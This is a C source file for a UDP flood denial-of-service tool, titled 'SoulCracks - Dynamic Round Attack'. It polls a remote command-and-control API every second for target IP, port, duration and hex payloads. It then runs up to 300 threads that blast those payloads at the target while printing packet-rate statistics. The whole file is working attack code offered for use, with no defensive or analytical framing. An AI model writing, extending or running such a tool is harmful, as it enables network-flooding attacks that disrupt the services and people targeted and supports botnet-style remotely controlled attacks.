#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <curl/curl.h>
#include <jansson.h>
#include <sys/socket.h>
#include <signal.h>
#include <stdatomic.h>

#define API_URL        "https://my-production-5d0f.up.railway.app/api/mustafa/"
#define CHECK_INTERVAL 1
#define HEX_MAX        4096
#define MAX_PAYLOADS   512
#define MAX_THREADS    300
#define MAX_RETRIES    0  // Set to 0 for infinite retries

// Performance counters
atomic_ulong total_packets = 0;
unsigned long last_packet_count = 0;
time_t last_stat_time = 0;
pthread_mutex_t counter_mutex = PTHREAD_MUTEX_INITIALIZER;

// Round tracking structure
typedef struct {
    int round_num;
    char hex[HEX_MAX];
    size_t byte_len;
    unsigned char *bytes;
    time_t last_updated;
} RoundPayload;

// Target session
typedef struct {
    char ip[16];
    int port;
    RoundPayload rounds[MAX_PAYLOADS];
    int round_count;
    int duration;
    int active_rounds[MAX_PAYLOADS];
    pthread_mutex_t rounds_lock;
    int should_stop;
} TargetSession;

TargetSession g_target = {0};
pthread_t update_thread;
pthread_t *worker_threads = NULL;
int active_workers = 0;

// HTTP response structure
struct string {
    char *ptr;
    size_t len;
};

// Write callback for curl
size_t write_func(void *ptr, size_t size, size_t nmemb, struct string *s) {
    size_t new_len = s->len + size * nmemb;
    char *new_ptr = realloc(s->ptr, new_len + 1);
    if (new_ptr == NULL) return 0;
    s->ptr = new_ptr;
    memcpy(s->ptr + s->len, ptr, size * nmemb);
    s->ptr[new_len] = '\0';
    s->len = new_len;
    return size * nmemb;
}

// Hex to bytes conversion
size_t hex_to_bytes(const char *hex, unsigned char **bytes) {
    if (!hex) return 0;
    
    size_t hex_len = strlen(hex);
    if (hex_len % 2 != 0 || hex_len == 0) return 0;
    
    size_t byte_len = hex_len / 2;
    *bytes = malloc(byte_len);
    if (!*bytes) return 0;
    
    for (size_t i = 0; i < byte_len; i++) {
        unsigned int byte;
        char hex_byte[3] = {hex[i*2], hex[i*2+1], 0};
        if (sscanf(hex_byte, "%02x", &byte) != 1) {
            free(*bytes);
            return 0;
        }
        (*bytes)[i] = (unsigned char)byte;
    }
    return byte_len;
}

// Free rounds
void free_rounds(TargetSession *session) {
    pthread_mutex_lock(&session->rounds_lock);
    for (int i = 0; i < session->round_count && i < MAX_PAYLOADS; i++) {
        if (session->rounds[i].bytes) {
            free(session->rounds[i].bytes);
            session->rounds[i].bytes = NULL;
        }
    }
    pthread_mutex_unlock(&session->rounds_lock);
}

// Update round
void update_round(TargetSession *session, int round_num, const char *new_hex) {
    pthread_mutex_lock(&session->rounds_lock);
    
    int round_index = -1;
    for (int i = 0; i < session->round_count; i++) {
        if (session->rounds[i].round_num == round_num) {
            round_index = i;
            break;
        }
    }
    
    if (round_index == -1 && session->round_count < MAX_PAYLOADS) {
        round_index = session->round_count;
        session->round_count++;
        session->rounds[round_index].round_num = round_num;
        session->rounds[round_index].bytes = NULL;
    }
    
    if (round_index >= 0) {
        if (session->rounds[round_index].bytes) {
            free(session->rounds[round_index].bytes);
        }
        
        strncpy(session->rounds[round_index].hex, new_hex, HEX_MAX - 1);
        session->rounds[round_index].hex[HEX_MAX - 1] = '\0';
        session->rounds[round_index].byte_len = hex_to_bytes(new_hex, &session->rounds[round_index].bytes);
        session->rounds[round_index].last_updated = time(NULL);
        session->active_rounds[round_index] = 1;
    }
    
    pthread_mutex_unlock(&session->rounds_lock);
}

// Worker thread
void *worker_task(void *arg) {
    (void)arg;
    int sock;
    struct sockaddr_in server_addr;
    
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        return NULL;
    }
    
    int buffer_size = 2 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(g_target.port);
    inet_pton(AF_INET, g_target.ip, &server_addr.sin_addr);
    
    time_t end_time = time(NULL) + g_target.duration;
    int round_index = 0;
    unsigned long local_count = 0;
    struct timespec sleep_time = {0, 10000};
    
    while (time(NULL) < end_time && !g_target.should_stop) {
        pthread_mutex_lock(&g_target.rounds_lock);
        if (g_target.round_count > 0) {
            round_index = (round_index + 1) % g_target.round_count;
            RoundPayload *round = &g_target.rounds[round_index];
            
            if (round->bytes && round->byte_len > 0) {
                pthread_mutex_unlock(&g_target.rounds_lock);
                
                ssize_t sent = sendto(sock, round->bytes, round->byte_len, 0,
                                      (struct sockaddr *)&server_addr, sizeof(server_addr));
                if (sent > 0) {
                    local_count++;
                    if (local_count >= 1000) {
                        atomic_fetch_add(&total_packets, local_count);
                        local_count = 0;
                    }
                }
                nanosleep(&sleep_time, NULL);
            } else {
                pthread_mutex_unlock(&g_target.rounds_lock);
            }
        } else {
            pthread_mutex_unlock(&g_target.rounds_lock);
            usleep(1000);
        }
    }
    
    if (local_count > 0) {
        atomic_fetch_add(&total_packets, local_count);
    }
    
    close(sock);
    return NULL;
}

// Round updater thread
void *round_updater(void *arg) {
    (void)arg;
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    
    struct string s = {NULL, 0};
    
    curl_easy_setopt(curl, CURLOPT_URL, API_URL);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 3L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_func);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    
    printf("[UPDATER] Started - fetching rounds every second\n");
    
    while (!g_target.should_stop) {
        if (s.ptr) {
            free(s.ptr);
            s.ptr = NULL;
            s.len = 0;
        }
        
        s.ptr = malloc(1);
        if (s.ptr) s.ptr[0] = '\0';
        
        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK && s.ptr && s.len > 0) {
            json_error_t error;
            json_t *root = json_loads(s.ptr, 0, &error);
            if (root) {
                if (g_target.duration == 0) {
                    json_t *sessions = json_object_get(root, "sessions");
                    if (sessions && json_is_array(sessions) && json_array_size(sessions) > 0) {
                        json_t *first_session = json_array_get(sessions, 0);
                        json_t *time_obj = json_object_get(first_session, "time");
                        if (time_obj && json_is_integer(time_obj)) {
                            g_target.duration = (int)json_integer_value(time_obj);
                            printf("[UPDATER] Session duration: %d seconds\n", g_target.duration);
                        }
                    }
                }
                
                json_t *sessions = json_object_get(root, "sessions");
                if (sessions && json_is_array(sessions)) {
                    for (size_t i = 0; i < json_array_size(sessions); i++) {
                        json_t *session = json_array_get(sessions, i);
                        
                        json_t *ip_obj = json_object_get(session, "ip");
                        json_t *port_obj = json_object_get(session, "port");
                        if (ip_obj && json_is_string(ip_obj)) {
                            const char *new_ip = json_string_value(ip_obj);
                            if (strcmp(g_target.ip, new_ip) != 0) {
                                strncpy(g_target.ip, new_ip, 15);
                                g_target.ip[15] = '\0';
                                printf("[UPDATER] Target IP updated: %s\n", g_target.ip);
                            }
                        }
                        if (port_obj && json_is_string(port_obj)) {
                            int new_port = atoi(json_string_value(port_obj));
                            if (g_target.port != new_port) {
                                g_target.port = new_port;
                                printf("[UPDATER] Target port updated: %d\n", g_target.port);
                            }
                        }
                        
                        json_t *rounds = json_object_get(session, "rounds");
                        if (rounds && json_is_array(rounds)) {
                            int rounds_updated = 0;
                            
                            for (size_t r = 0; r < json_array_size(rounds); r++) {
                                json_t *round = json_array_get(rounds, r);
                                json_t *round_num_obj = json_object_get(round, "round");
                                json_t *hex_obj = json_object_get(round, "hex");
                                
                                if (round_num_obj && json_is_integer(round_num_obj) &&
                                    hex_obj && json_is_string(hex_obj)) {
                                    int round_num = (int)json_integer_value(round_num_obj);
                                    const char *hex = json_string_value(hex_obj);
                                    
                                    update_round(&g_target, round_num, hex);
                                    rounds_updated++;
                                }
                            }
                            
                            if (rounds_updated > 0) {
                                static time_t last_log = 0;
                                time_t now = time(NULL);
                                if (now - last_log >= 5) {
                                    printf("[UPDATER] Updated %d rounds (Total: %d)\n", 
                                           rounds_updated, g_target.round_count);
                                    last_log = now;
                                }
                            }
                        }
                    }
                }
                json_decref(root);
            }
        }
        
        sleep(1);
    }
    
    if (s.ptr) free(s.ptr);
    curl_easy_cleanup(curl);
    return NULL;
}

// Statistics display thread
void *stats_display(void *arg) {
    (void)arg;
    while (!g_target.should_stop) {
        sleep(2);
        
        unsigned long current = atomic_load(&total_packets);
        time_t now = time(NULL);
        
        if (last_stat_time > 0) {
            double elapsed = difftime(now, last_stat_time);
            if (elapsed > 0) {
                double pps = (current - last_packet_count) / elapsed;
                double mbps = (pps * 150) / (1024 * 1024);
                
                printf("\r[STAT] PPS: %.0f | ~%.2f Mbps | Total: %lu packets   ", 
                       pps, mbps, current);
                fflush(stdout);
            }
        }
        
        last_packet_count = current;
        last_stat_time = now;
    }
    return NULL;
}

// Signal handler
void signal_handler(int sig) {
    (void)sig;
    printf("\n\n[!] Stopping attack...\n");
    g_target.should_stop = 1;
    
    if (update_thread) pthread_join(update_thread, NULL);
    if (worker_threads) {
        for (int i = 0; i < active_workers; i++) {
            pthread_join(worker_threads[i], NULL);
        }
        free(worker_threads);
    }
    
    printf("[+] Final Statistics:\n");
    printf("[+] Total Packets Sent: %lu\n", atomic_load(&total_packets));
    if (g_target.duration > 0) {
        printf("[+] Average PPS: %.0f\n", (double)atomic_load(&total_packets) / g_target.duration);
    }
    
    free_rounds(&g_target);
    exit(0);
}

int main() {
    printf("========================================\n");
    printf("   SoulCracks - Dynamic Round Attack   \n");
    printf("========================================\n");
    
    memset(&g_target, 0, sizeof(g_target));
    pthread_mutex_init(&g_target.rounds_lock, NULL);
    g_target.should_stop = 0;
    
    long cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    int threads = (cpu_cores > 0) ? cpu_cores * 10 : 200;
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (threads < 50) threads = 50;
    
    printf("[SYSTEM] CPU Cores: %ld\n", cpu_cores);
    printf("[SYSTEM] Worker Threads: %d\n", threads);
    printf("========================================\n\n");
    
    signal(SIGINT, signal_handler);
    curl_global_init(CURL_GLOBAL_ALL);
    
    printf("[MAIN] Starting round updater...\n");
    pthread_create(&update_thread, NULL, round_updater, NULL);
    
    printf("[MAIN] Waiting for initial rounds...\n");
    int wait_cycles = 0;
    int max_wait = 0;  // 0 = wait forever
    
    while (g_target.round_count == 0 && !g_target.should_stop) {
        if (wait_cycles % 10 == 0 && wait_cycles > 0) {
            printf("[MAIN] Still waiting for rounds... (%d seconds elapsed)\n", wait_cycles);
            printf("[MAIN] Make sure API is accessible: %s\n", API_URL);
        }
        sleep(1);
        wait_cycles++;
        
        // Optional: Exit after 300 seconds if no rounds (set to 0 to wait forever)
        if (max_wait > 0 && wait_cycles >= max_wait) {
            printf("[ERROR] No rounds received after %d seconds\n", max_wait);
            return 1;
        }
    }
    
    if (g_target.round_count == 0) {
        printf("[ERROR] No rounds received from API\n");
        return 1;
    }
    
    printf("[MAIN] Received %d rounds after %d seconds\n", g_target.round_count, wait_cycles);
    printf("[MAIN] Starting attack with %d rounds\n", g_target.round_count);
    
    worker_threads = malloc(threads * sizeof(pthread_t));
    
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&worker_threads[i], NULL, worker_task, NULL) == 0) {
            active_workers++;
        }
    }
    
    printf("[MAIN] %d worker threads active\n", active_workers);
    
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, stats_display, NULL);
    
    while (g_target.duration == 0 && !g_target.should_stop) {
        sleep(1);
    }
    
    if (g_target.duration > 0 && !g_target.should_stop) {
        printf("\n[MAIN] Attack will run for %d seconds\n", g_target.duration);
        
        for (int i = 0; i <= g_target.duration && !g_target.should_stop; i++) {
            sleep(1);
            if (i % 10 == 0 && i > 0) {
                printf("\n[MAIN] Progress: %d/%d seconds\n", i, g_target.duration);
            }
        }
    }
    
    signal_handler(0);
    curl_global_cleanup();
    return 0;
}
